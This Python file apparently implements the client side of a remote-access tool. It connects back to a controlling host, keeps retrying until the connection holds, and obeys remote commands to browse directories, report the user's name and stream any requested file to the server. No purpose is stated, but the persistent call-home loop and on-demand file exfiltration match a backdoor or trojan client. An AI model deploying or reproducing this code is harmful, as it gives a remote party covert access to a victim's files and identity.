import socket
import time
import os
import stat


class Client:

    def __init__(self, host, port):
        self.socket = None
        self.port = port
        self.host = host

    def run(self):

        self.connect_server()
        while True:
            data = self.socket.recv(4096).decode("UTF-8")

            if data:
                if data == '1':
                    FileBrowser(self).run()
                if data == '2':
                    self.socket.sendall(bytes(os.getenv("USERNAME"), "UTF-8"))
            else:
                print("Connection lost.")
                self.connect_server()

    def connect_server(self):

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connected = False
        while not connected:
            try:
                self.socket.connect((self.host, self.port))
                connected = True
                print("Connected.")
            except socket.error:
                print("Trying to connect...")
                time.sleep(1)


class FileBrowser:

    def __init__(self, client):
        self.client = client

    def run(self):

        self.client.socket.sendall(bytes(os.getcwd(), "UTF-8"))
        while True:
            cmd = self.client.socket.recv(4096)
            cmd = cmd.decode("UTF-8")
            cmd = cmd.split("~")

            if cmd[0] == 'ls':
                asd = self.ls(cmd)
                self.client.socket.sendall(bytes(asd, "UTF-8"))
            elif cmd[0] == 'cd':
                asd = self.cd(cmd)
                self.client.socket.sendall(bytes(asd, "UTF-8"))
            elif cmd[0] == 'cp':
                asd = self.file_transfer(cmd)
                self.client.socket.sendall(bytes(asd, "UTF-8"))
            elif cmd[0] == 'pwd':
                asd = os.getcwd()
                self.client.socket.sendall(bytes(asd, "UTF-8"))
            elif cmd[0] == 'exit':
                break
            else:
                self.client.socket.sendall(bytes("Command not found.",
                                                 "UTF-8"))

    def ls(self, cmd):
        result = []
        if len(cmd) == 1:
            cmd.append('.')
        try:
            for f in os.listdir(cmd[1]):
                if stat.S_ISDIR(os.stat(f).st_mode):
                    f += "/"
                result.append(f)
            result = '  '.join(result)
        except:
            result = "No such file or directory."
        return result

    def cd(self, cmd):

        if len(cmd) == 1:
            cmd.append(os.environ["HOME"])
        try:
            os.chdir(cmd[1])
        except:
            return "No such file or directory."
        return self.ls(["ls", "."])

    def file_transfer(self, file_name):

        try:
            f = open(os.getcwd()+"/"+file_name[1], "rb")

            while True:
                data = f.read(4096)
                if not data:
                    break
                self.client.socket.sendall(data)
            f.close()
            time.sleep(0.8)
            self.client.socket.sendall(bytes("EOFX", "UTF-8"))
            time.sleep(0.8)

            return "File transfered."
        except:
            self.client.socket.sendall(bytes("EOFX", "UTF-8"))
            time.sleep(0.8)
            return "Failed to transfer a file."
